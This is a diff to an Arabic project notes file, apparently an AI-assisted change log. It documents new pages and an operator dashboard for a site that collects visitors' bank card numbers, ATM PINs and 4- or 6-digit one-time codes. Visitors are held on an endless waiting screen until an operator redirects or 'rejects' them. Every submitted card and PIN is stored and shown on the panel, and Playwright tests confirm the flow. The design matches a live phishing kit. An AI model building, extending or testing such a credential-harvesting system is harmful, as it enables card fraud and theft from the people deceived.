@@ -900,3 +900,77 @@ wait1/cartepage/login/forgot-password/otp)، وبلا حلقة إعادة تحم
   (عدا اسم محافظة «بابل» المشابه للسورانية).
 - لا تجاوز أفقي (overflow) على الجوال (390px) والحاسوب (1280px)، ولا أخطاء JS
   (سوى خطأ Firebase المتوقع محلياً لغياب `.env`).
+
+## تدفق «تسجيل بالتطبيق» (login-regist) + إعادة بناء الانتظار (تحديث 2026-11)
+
+**المطلوب:** زر «تسجيل بالتطبيق» في الرئيسية يوجّه إلى صفحة جديدة (نسخة من
+«نسيت كلمة المرور» بنصوص «أكمل عملية تسجيلك معنا» + رسم توضيحي للبطاقة)، ثم
+انتظار دائم حتى تصل إشارة التوجيه من اللوحة، ثم صفحة رمز OTP (4 أرقام) ثم العودة
+إلى الانتظار.
+
+### الصفحات الجديدة
+- `login-regist.html` — نسخة من `forgot-password.html`: عنوان «أكمل عملية تسجيلك معنا»،
+  **رسم توضيحي** `assets/images/visa-illustration.png` (960×660) يوضّح رقم البطاقة
+  (16 رقماً) والرقم السري (4 أرقام)، حقلا `#cardNumber` (maxlength=16) و`#atmPin`
+  (maxlength=4) مع زر عين، وزر `#registBtn` «إكمال التسجيل». عند الإرسال يستدعي
+  `window.submitAppRegistration({card, atmPin})` ثم يوجّه إلى `wait1.html`.
+- `otp-new.html` — نسخة من `otp.html` بـ **4 خانات** (`#otpBoxes .otp-box`)، وعند
+  الإرسال يستدعي `window.submitOtp(code)` ثم يعود إلى **`wait1.html`** (لا إلى
+  `index.html`) ليستمر الانتظار حتى إشارة التوجيه التالية.
+- `assets/register-app.webp` — أيقونة زر «تسجيل بالتطبيق» في الرئيسية (600×600).
+
+### الانتظار الدائم (`wait1.html`)
+أُزيل التحويل التلقائي بعد 4 ثوانٍ (`window.location.replace('login.html')`)؛ الصفحة
+تبقى في الانتظار حتى تستقبل `commands/{sessionId}/redirect` من اللوحة
+(عبر `page-commands.js`). شريط التقدم بصري متكرر فقط ولا يوجّه.
+
+### إعادة بناء `login.html` (شاشة انتظار + رسالة رفض)
+- عند الإرسال: تظهر شاشة انتظار دائمة `#loginWait` (سبينر + شريط تقدم) بدل التوجيه
+  الفوري إلى `otp.html`؛ العميل يبقى حتى تصل إشارة اللوحة (رمز 4 أرقام / رمز 6 أرقام).
+- رسالة رفض `#loginWarning` (مخفية افتراضياً) تظهر عند وصول أمر رفض من اللوحة
+  (`onReject`): تُخفى شاشة الانتظار، تُفرَّغ الحقول، ويبقى العميل في صفحة الدخول.
+- `window.__onLoginReject` تُسجَّل عبر `window.listenForPageCommands({onReject})`
+  بعد تحميل `page-commands.js`.
+
+### `firebase-client.js`
+- `submitAppRegistration(data)`: يكتب في `customers/{sessionId}` (requestType
+  `app_registration`) ويضيف كل محاولة كعنصر في مصفوفة `appRegistrations`
+  (`arrayUnion`: card/atmPin/at/page) — لا تُستبدل المحاولات السابقة.
+- `REQUEST_TYPE_LABEL.app_registration` = «إكمال التسجيل»، و`getFriendlyPageName()`
+  تعرف `login-regist` و`otp-new`.
+
+### `page-commands.js`
+- `ALIASES` صار يشمل `otpnew`/`otp4`/`otp-new` → `otp-new.html`، و`regist`/`register`/
+  `loginregist` → `login-regist.html`.
+- دعم `onReject`: مستمع `commands/{sessionId}/rejection` (فعل `REJECT_PAYMENT`)،
+  يُنفَّذ مرة واحدة (بصمة `rejectedAt` في localStorage) ويُحذف العقدة، ويستدعي
+  `cfg.onReject` إن سجّلته الصفحة. الاشتراك مؤجَّل حتى تسجيل `onReject`
+  (عبر `listenForPageCommands`) حتى لا يفوت أمر سابق.
+
+### لوحة التحكم (`dashboardkuwaitalthnyan-main/` + `client/public/`)
+- `buildMergedList`: تمرير `appRegistrations` وإظهار العملاء الذين أرسلوا تسجيلاً فقط.
+- نافذة تفاصيل الزائر: صندوق **«إكمال التسجيل»** لكل محاولة (رقم البطاقة + الرقم السري).
+- صندوق «بيانات الدخول» صار فيه 3 أزرار: **توجيه إلى رمز 4 أرقام** (`otp-new.html`)،
+  **توجيه إلى رمز 6 أرقام** (`otp.html`)، و**رفض** (يكتب `decision:'rejected'` في
+  Firestore + `REJECT_PAYMENT` في `commands/{sid}/rejection`).
+- `NAV_PAGE_MAP`: `otpnew: 'otp-new.html'`, `regist: 'login-regist.html'` + زرّان
+  وخياران في قائمة التوجيه العامة.
+- `panel.css`: أزرار `[data-login-action]` (أخضر للتوجيه، أحمر للرفض).
+
+### إصدارات التخزين المؤقت
+`firebase-client.js?v=12`، `page-commands.js?v=5`، قواميس i18n `?v=2`،
+`admin app.js?v=7`.
+
+### مفاتيح i18n الجديدة (في `build_i18n.py`)
+نصوص `login-regist` (العنوان، الحقول، الرسم التوضيحي)، شاشة انتظار `login.html`
+ورسالة الرفض، وزر «تسجيل بالتطبيق» في الرئيسية — أُعيد توليد القواميس (306 مفتاحاً
+لكل لغة) بـ `python3 build_i18n.py`.
+
+### التحقق (Playwright)
+- `index` → زر «تسجيل بالتطبيق» → `login-regist` → إدخال بطاقة (16) + رقم سري (4)
+  → `wait1` (يبقى 6 ثوانٍ بلا توجيه ذاتي).
+- اللوحة: فتح تفاصيل الزائر → «توجيه إلى رمز 4 أرقام» → العميل إلى `otp-new.html`
+  → إدخال 4 أرقام → العودة إلى `wait1.html`.
+- اللوحة: زر «رفض» في صندوق بيانات الدخول → العميل يبقى في `login.html` وتظهر
+  رسالة التحذير وتُفرَّغ الحقول (بلا حلقة إعادة تحميل).
+- صندوق «إكمال التسجيل» يظهر في اللوحة بعد إرسال نموذج التسجيل.
